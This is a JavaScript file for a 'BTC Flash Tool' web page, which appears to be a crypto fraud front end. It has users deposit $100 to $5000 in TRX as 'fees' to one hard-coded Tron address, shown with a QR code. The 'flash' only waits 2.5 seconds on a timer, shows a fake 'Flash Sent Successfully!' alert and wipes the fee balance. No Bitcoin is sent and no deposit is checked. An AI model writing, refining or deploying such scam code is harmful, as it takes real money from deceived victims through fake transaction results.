// Wait until the DOM is fully loaded before running the script
document.addEventListener('DOMContentLoaded', () => {
    console.log("DOM fully loaded. Initializing BTC Flash Tool script.");

    // --- Elements ---
    const overlay = document.getElementById('universalModalOverlay');
    const modalContent = document.getElementById('universalModalContent');
    const addTronBtn = document.getElementById('addTronFeeBtn');
    const flashButton = document.getElementById('flashButton');
    const recipientInput = document.getElementById('recipient');
    const amountInput = document.getElementById('amount');
    const processingSection = document.getElementById('processingSection');
    const tronBalanceDisplay = document.getElementById('tron-balance-display');
    const copiedPopup = document.getElementById('copied-popup');
    const successPopup = document.getElementById('success-popup');
    const depositStatusElement = document.getElementById('deposit-status');
    const maxFlashInfoElement = document.getElementById('max-flash-info');
    // Login elements
    const authLinksDiv = document.getElementById('auth-links');
    const userSessionDiv = document.getElementById('user-session');
    const usernameDisplaySpan = document.getElementById('username-display');
    const logoutButton = document.getElementById('logout-button');

    console.log("Checking essential elements...");
    // --- Check if essential elements exist ---
    const essentialElements = {
        overlay, modalContent, addTronBtn, flashButton, recipientInput,
        amountInput, processingSection, tronBalanceDisplay,
        copiedPopup, successPopup, depositStatusElement, maxFlashInfoElement,
        authLinksDiv, userSessionDiv, usernameDisplaySpan, logoutButton
    };
    let allElementsFound = true;
    for (const key in essentialElements) {
        if (!essentialElements[key]) {
             // Allow missing elements specific to the removed ETH section
             if (key !== 'addEthBtn' && key !== 'ethBalanceDisplay' && key !== 'networkSelect') {
                console.error(`Initialization Error: Element with ID '${key}' not found.`);
                allElementsFound = false;
            }
        }
    }
    if (!allElementsFound) {
         alert(`Initialization Error: One or more critical page elements are missing. The tool cannot start.`);
         return;
    }
     console.log("All essential elements found.");

    // --- State & Configuration ---
    let currentTronBalance = 0.00; // TRX fee balance
    let isViewingDepositInfo = false; // Tracks if deposit modal is open
    let maxFlashAmountBTC = 0; // Max flashable BTC

    const WALLET_MAX_FLASH_BTC = 1000;
    const MIN_FLASH_AMOUNT_BTC = 0.1;
    const FEE_PER_UNIT_FLASH = 100;
    const FLASH_UNIT_AMOUNT_BTC = 0.1;
    const TRX_PER_USD = 4.10;
    // --- #### MINIMUM DEPOSIT UPDATED #### ---
    const MIN_DEPOSIT_USD = 100; // Minimum TRX deposit in USD is now $100
    // --- ################################ ---
    const MAX_DEPOSIT_USD = 5000;
    const TRON_DEPOSIT_ADDRESS = "TPowMg7Jd3DpwDggkoSzxuTU8pGTksdua8";

    const FEE_NETWORK_DETAILS = {
        key: "tron", name: "Tron (TRC20)", ticker: "TRX", address: TRON_DEPOSIT_ADDRESS, iconClass: "tron-icon", rate: TRX_PER_USD, qrPrefix: "tron:", minFee: 0.5, cryptoPrecision: 6
    };


    // --- UI Update Function based on Login State ---
    function updateLoginStateUI() {
        const loggedInUsername = localStorage.getItem('loggedInUser');
        if (loggedInUsername) {
            if (usernameDisplaySpan) usernameDisplaySpan.textContent = loggedInUsername;
            if (userSessionDiv) userSessionDiv.style.display = 'block';
            if (authLinksDiv) authLinksDiv.style.display = 'none';
            console.log(`User '${loggedInUsername}' is logged in.`);
        } else {
            if (usernameDisplaySpan) usernameDisplaySpan.textContent = '';
            if (userSessionDiv) userSessionDiv.style.display = 'none';
            if (authLinksDiv) authLinksDiv.style.display = 'block';
            console.log("User is logged out.");
        }
        checkFlashButtonEligibility();
    }

    // --- Utility Functions ---
    function showModal(content) { if (!modalContent || !overlay) return; modalContent.innerHTML = content; overlay.style.display = 'flex'; void overlay.offsetWidth; overlay.classList.add('show'); isViewingDepositInfo = true; checkFlashButtonEligibility(); console.log("Modal shown."); }
    function hideModal() { if (!modalContent || !overlay) return; overlay.classList.remove('show'); isViewingDepositInfo = false; checkFlashButtonEligibility(); const t = 300; setTimeout(() => { if (!overlay.classList.contains('show')) { overlay.style.display = 'none'; modalContent.innerHTML = ''; } }, t); console.log("Modal hidden."); }
    function showPopup(element) { if (!element) { console.warn("Popup element null."); return; } document.querySelectorAll('.popup.show').forEach(p => p.classList.remove('show')); element.classList.add('show'); setTimeout(() => { element.classList.remove('show'); }, 2500); }
    async function copyToClipboard(text) { try { if (!navigator.clipboard) { console.warn("Using fallback clipboard."); const ta=document.createElement("textarea"); ta.value=text; ta.style.position="fixed"; ta.style.top="-9999px"; ta.style.left="-9999px"; document.body.appendChild(ta); ta.focus(); ta.select(); let s=false; try{s=document.execCommand('copy');}catch(e){console.error('Fallback copy failed:',e);throw e;}finally{document.body.removeChild(ta);} if(s){showPopup(copiedPopup);console.log("Copied (fallback).");return;}else{throw new Error('Fallback failed.');}} else {await navigator.clipboard.writeText(text);showPopup(copiedPopup);console.log("Copied (async).");}} catch(e){console.error('Copy failed: ',e);alert('Could not copy. Please copy manually.');throw e;}}
    function formatBTC(num) { const n = Number(num); return isNaN(n) ? 'N/A' : n.toLocaleString('en-US', { maximumFractionDigits: 8 }); }
    function formatNumber(num, digits = 0) { const n = Number(num); return isNaN(n) ? 'N/A' : n.toLocaleString('en-US', { maximumFractionDigits: digits }); }
    function updateBalanceDisplay() {
        if (!tronBalanceDisplay) return;
        tronBalanceDisplay.textContent = `$${currentTronBalance.toFixed(2)}`;
        updateMaxFlashAmountDisplay();
        checkFlashButtonEligibility();
    }
    function calculateMaxFlashAmount() {
        const b = currentTronBalance;
        const minFeeForMinFlash = FEE_PER_UNIT_FLASH; // $100

        if (b < minFeeForMinFlash) {
             return 0;
        }
        const affordableUnits = Math.floor(b / FEE_PER_UNIT_FLASH);
        const potentialFlashAmount = affordableUnits * FLASH_UNIT_AMOUNT_BTC;
        if (potentialFlashAmount < MIN_FLASH_AMOUNT_BTC) {
             return 0;
        }
        const maxFlash = Math.min(potentialFlashAmount, WALLET_MAX_FLASH_BTC);
        return maxFlash;
    }
    function updateMaxFlashAmountDisplay() {
        if (!maxFlashInfoElement || !amountInput) return;
        maxFlashAmountBTC = calculateMaxFlashAmount();
        const ff = formatNumber(FEE_PER_UNIT_FLASH, 0);
        const fu = FLASH_UNIT_AMOUNT_BTC;
        const fm = MIN_FLASH_AMOUNT_BTC;
        const fmx = formatBTC(maxFlashAmountBTC);

        maxFlashInfoElement.innerHTML = `Max flashable (<span class="text-teal-400">$${ff}</span> TRX fee per <span class="text-teal-400">${fu} BTC</span>): <span id="max-flash-amount-display" class="font-semibold text-teal-400">${fmx} BTC</span>`;
        amountInput.placeholder = `Min ${fm} / Max ${fmx}`;
        amountInput.max = maxFlashAmountBTC > 0 ? maxFlashAmountBTC : '';
        amountInput.min = MIN_FLASH_AMOUNT_BTC;
    }

    function checkFlashButtonEligibility() {
        if (!flashButton) return;
        if (isViewingDepositInfo) {
            flashButton.title = "Close the deposit window first.";
            flashButton.classList.add('opacity-50', 'cursor-not-allowed');
        } else {
            const currentMaxFlashCalculatedBTC = calculateMaxFlashAmount();
            let reason = 'Initiate BTC Flash Transaction';
            if (currentMaxFlashCalculatedBTC < MIN_FLASH_AMOUNT_BTC) {
                 reason = "Insufficient TRX fee balance to initiate BTC flash.";
            }
            flashButton.title = reason;
            flashButton.classList.remove('opacity-50', 'cursor-not-allowed');
        }
         //console.log("checkFlashButtonEligibility called. isViewingDepositInfo:", isViewingDepositInfo, "Title:", flashButton.title);
    }

    function generateQrCode(data, id) { const cont = document.getElementById(id); if (!cont) { console.error('QR Container not found:', id); return; } cont.innerHTML = ''; try { if (typeof QRCodeStyling === 'undefined') { console.error("QR lib not loaded."); cont.textContent = "Error: QR lib failed."; cont.style.color = 'var(--error-color)'; return; } const qr = new QRCodeStyling({ width: 150, height: 150, type: 'svg', data: data, dotsOptions: { color: "#000", type: "dots" }, backgroundOptions: { color: "#fff" }, cornersSquareOptions: { type: "extra-rounded", color: "var(--primary-color)" }, cornersDotOptions: { type: "dot", color: "var(--primary-color)" }, qrOptions: { errorCorrectionLevel: 'M' }, imageOptions: { hideBackgroundDots: true, imageSize: 0.4, margin: 4 } }); qr.append(cont); } catch (e) { console.error("QR generation error:", e); cont.textContent = "Failed to generate QR."; cont.style.color = 'var(--error-color)'; } }
    function createConfirmationHtml() {
        const d = FEE_NETWORK_DETAILS;
        // Use the updated MIN_DEPOSIT_USD for text and input attributes
        const pt = `Min $${MIN_DEPOSIT_USD.toFixed(2)} - Max $${MAX_DEPOSIT_USD.toFixed(2)}`;
        return `<div class="modal-header"><span class="modal-icon-placeholder ${d.iconClass}"></span><span>Deposit ${d.ticker} Fee (for BTC Flash)</span></div><div class="modal-body"><p class="mb-4 text-sm text-gray-400">Enter amount in USD ($) to deposit as ${d.name} fees to enable BTC flash. Min deposit is <strong>$${MIN_DEPOSIT_USD.toFixed(2)}</strong>.</p><label for="depositUsdAmountInput">Amount in USD</label><input type="number" id="depositUsdAmountInput" name="usd_amount" min="${MIN_DEPOSIT_USD}" max="${MAX_DEPOSIT_USD}" placeholder="${pt}" step="0.01" required class="w-full bg-gray-800 border border-gray-600 rounded-lg p-3 text-gray-200 text-sm focus:outline-none focus:ring-2 focus:ring-teal-400"><p id="modal-error-message" class="modal-error"></p></div><hr class="modal-separator"><div class="modal-actions"><button class="modal-button proceed-btn" data-action="proceedDeposit" data-network="${d.key}">Show Deposit Info</button><button class="modal-button close-modal-btn" data-action="close">Cancel</button></div>`;
    }
    function createDepositScreenHtml(ua, ca, da) {
        const d = FEE_NETWORK_DETAILS;
        const nn = d.name;
        const t = d.ticker;
        const us = `$${ua.toFixed(2)}`;
        const cf = ca.toFixed(d.cryptoPrecision);
        const qd = `${d.qrPrefix}${da}?amount=${cf}`;
        return `<div class="deposit-screen-content"><h2 class="text-xl font-semibold mb-4 text-center text-teal-400">Deposit ${t} Fee for BTC Flash</h2><p class="text-sm text-gray-400 mb-4 text-left">To activate BTC flash with <strong>${us}</strong> worth of fees, send <strong>exact ${t} amount</strong> below:</p><div class="deposit-info-line"><strong class="label">Amount:</strong><span class="value crypto-amount text-lg text-teal-300">${cf} ${t}</span></div><div class="deposit-info-line items-start"><span class="icon-placeholder ${d.iconClass} icon mt-1"></span><strong class="label">To Address (${nn}):</strong><div class="flex-grow break-all mr-2"><span class="value text-sm" id="deposit-address-text">${da}</span></div><button class="copy-button ml-auto flex-shrink-0" data-clipboard-text="${da}" title="Copy Address"><i class="fas fa-copy text-xs"></i> <span class="copy-button-text text-xs">Copy</span></button></div><div class="qr-section"><p class="text-sm mb-2">Scan QR Code (check amount):</p><div class="qr-code-container" id="qr-code-container"><p class="text-gray-500 text-xs py-4">Generating QR...</p></div><p class="text-xs mt-2 text-gray-500">Send only ${t} (${nn}). Other assets may be lost.</p></div><div class="deposit-note"><i class="fas fa-info-circle mr-2"></i><strong> Note:</strong> Balance updates require verification after deposit. You can close this window.</div><div class="modal-actions mt-5"><button class="modal-button close-modal-btn" data-action="closeDepositWindow">Close Window</button></div></div>`;
    }

    // --- Event Listeners Setup ---
    function handleAddFeeClick(e) {
        const b = e.target.closest('button.add-button'); if (!b) return;
        if (isViewingDepositInfo) return;
        console.log(`Add TRX fee clicked.`);
        showModal(createConfirmationHtml());
        if(addTronBtn) addTronBtn.disabled = true;
    }
    if (addTronBtn) addTronBtn.addEventListener('click', handleAddFeeClick);

    if (modalContent) {
        modalContent.addEventListener('click', (e) => {
            const tb = e.target.closest('button[data-action], button[data-clipboard-text]'); if (!tb) return;
            const act = tb.dataset.action; const ct = tb.dataset.clipboardText;

            if (act === 'close' || act === 'closeDepositWindow') {
                hideModal();
                if(addTronBtn) addTronBtn.disabled = false;
                console.log("Deposit window closed.");
            } else if (act === 'proceedDeposit') {
                console.log("Proceed Deposit clicked.");
                const ai = document.getElementById('depositUsdAmountInput');
                const er = document.getElementById('modal-error-message');
                if (!ai || !er) { console.error("Deposit modal elements missing/invalid."); alert("Error preparing deposit."); hideModal(); return; }
                const ua = parseFloat(ai.value);
                er.textContent = ''; er.classList.remove('show'); ai.style.borderColor = '';
                // Use updated MIN_DEPOSIT_USD in validation
                if (isNaN(ua) || ua < MIN_DEPOSIT_USD || ua > MAX_DEPOSIT_USD) {
                    er.textContent = `Amount must be between $${MIN_DEPOSIT_USD.toFixed(2)} and $${MAX_DEPOSIT_USD.toFixed(2)}.`;
                    er.classList.add('show'); ai.style.borderColor = 'var(--error-color)'; ai.focus();
                    console.warn("Deposit validation failed:", ai.value); return;
                }
                const d = FEE_NETWORK_DETAILS;
                const ca = ua * d.rate;
                const da = d.address;
                modalContent.innerHTML = createDepositScreenHtml(ua, ca, da);
                requestAnimationFrame(() => {
                    const qc = 'qr-code-container'; const q = document.getElementById(qc);
                    if (q) { const qd = `${d.qrPrefix}${da}?amount=${ca.toFixed(d.cryptoPrecision)}`; generateQrCode(qd, qc); }
                    else { console.error(`QR container #${qc} not found.`); const qe = document.getElementById(qc); if(qe) qe.innerHTML = `<p style="color: var(--error-color);">Error displaying QR.</p>`; }
                });
                console.log(`Deposit screen shown for TRX. NO automatic confirmation implemented.`);

            } else if (ct) {
                console.log(`Copy clicked: ${ct}`);
                copyToClipboard(ct).then(() => {
                    const cb=tb; const cbt=cb.querySelector('.copy-button-text'); const ot=cbt?cbt.textContent:'Copy';
                    if(cbt){cbt.textContent='Copied!';} else {cb.textContent='Copied!';}
                    cb.style.opacity=0.7;
                    setTimeout(()=>{
                        const currentButton = modalContent.querySelector(`button[data-clipboard-text="${ct}"]`);
                        if(currentButton){
                             const currentButtonText = currentButton.querySelector('.copy-button-text');
                             if(currentButtonText) {currentButtonText.textContent = ot;} else {currentButton.textContent=ot;}
                             currentButton.style.opacity = 1;
                        }
                    }, 1500);
                }).catch(err => { console.error("Copy failed:", err); });
            }
        });
    }

    if (overlay) {
        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) {
                console.log("Overlay clicked, hiding.");
                hideModal();
                if(addTronBtn) addTronBtn.disabled = false;
            }
        });
    }

    if (logoutButton) { logoutButton.addEventListener('click', (e) => { e.preventDefault(); console.log("Logout clicked."); try { localStorage.removeItem('loggedInUser'); console.log("Logged out state cleared."); updateLoginStateUI(); alert("You have been logged out."); } catch (er) { console.error("Logout error:", er); alert("Logout error."); } }); }

    // --- Flash Button Click Listener ---
    if (flashButton) {
        flashButton.addEventListener('click', () => {
            console.log("Flash BTC button clicked.");
            if (isViewingDepositInfo) { alert("❌ Cannot Flash.\n\nPlease close the deposit information window first."); console.warn("Flash blocked: Deposit info modal open."); return; }

            const currentMaxFlashCalculatedBTC = calculateMaxFlashAmount();
            if (currentMaxFlashCalculatedBTC < MIN_FLASH_AMOUNT_BTC) {
                alert("Cannot generate flash until TRX fee deposit is verified.");
                console.warn("Flash blocked: Insufficient TRX fees for minimum BTC flash amount.");
                return;
            }

            const recipient = recipientInput.value.trim();
            const amountStr = amountInput.value.trim();
            const amountBTC = parseFloat(amountStr);

            if (!recipient || !amountStr || isNaN(amountBTC) || amountBTC <= 0) { alert("⚠️ Please enter a valid Recipient BTC Address and Amount to Flash."); console.warn("Flash validation failed: Missing address or amount."); if (!recipient) recipientInput.focus(); else if (!amountStr || isNaN(amountBTC) || amountBTC <= 0) amountInput.focus(); return; }

            if (amountBTC > currentMaxFlashCalculatedBTC) {
                 alert(`⚠️ Requested amount (${formatBTC(amountBTC)} BTC) exceeds the maximum allowed (${formatBTC(currentMaxFlashCalculatedBTC)} BTC) based on your current TRX fee balance.`);
                 console.warn(`Flash blocked: Amount ${amountBTC} BTC exceeds calculated max ${currentMaxFlashCalculatedBTC} BTC`);
                 amountInput.focus();
                 return;
            }

            const btcAddressRegex = /^(1[a-km-zA-HJ-NP-Z1-9]{25,34})|(3[a-km-zA-HJ-NP-Z1-9]{25,34})|(bc1[ac-hj-np-z02-9]{11,71})$/;
            let addressValid = btcAddressRegex.test(recipient);
            let validationErrors = [];
            if (!addressValid) {
                 validationErrors.push(`Invalid or unsupported BTC address format.`);
            }
            if (amountBTC < MIN_FLASH_AMOUNT_BTC) { validationErrors.push(`Minimum flash amount is ${MIN_FLASH_AMOUNT_BTC} BTC.`); }
            if (amountBTC > WALLET_MAX_FLASH_BTC) { validationErrors.push(`Amount exceeds the overall tool limit (${formatBTC(WALLET_MAX_FLASH_BTC)} BTC).`); }

            if (validationErrors.length > 0) { alert("⚠️ Please fix the following issues:\n\n- " + validationErrors.join("\n- ")); console.warn("Flash validation failed:", validationErrors); return; }

            console.log(`Validation passed. Initiating BTC flash send.`); if(processingSection) processingSection.classList.add('show'); flashButton.classList.add('opacity-50', 'cursor-not-allowed'); flashButton.textContent = 'SENDING...'; if(recipientInput) recipientInput.disabled = true; if(amountInput) amountInput.disabled = true;
            setTimeout(() => {
                if(processingSection) processingSection.classList.remove('show'); flashButton.textContent = 'FLASH BTC'; flashButton.classList.remove('opacity-50', 'cursor-not-allowed'); if(recipientInput) recipientInput.disabled = false; if(amountInput) amountInput.disabled = false;

                alert(`✅ Flash Sent Successfully!\n\nAmount: ${formatBTC(amountBTC)} BTC\nRecipient: ${recipient}\n(Fee Paid via TRX)`);

                console.log(`Consuming TRX fee balance.`);
                currentTronBalance = 0.00;
                console.log("TRX Fee balance reset to $0.00.");
                updateBalanceDisplay();

                console.log("Flash transaction complete. UI reset."); if(recipientInput) recipientInput.value = ''; if(amountInput) amountInput.value = ''; checkFlashButtonEligibility();
            }, 2500);
        });
    }

    // --- Initial Setup Calls ---
    console.log("Running initial page setup..."); updateBalanceDisplay(); updateLoginStateUI(); console.log("Initial setup complete. BTC Flash Tool ready.");

}); // End of DOMContentLoaded listener
console.log("BTC Flash Script parsed successfully.");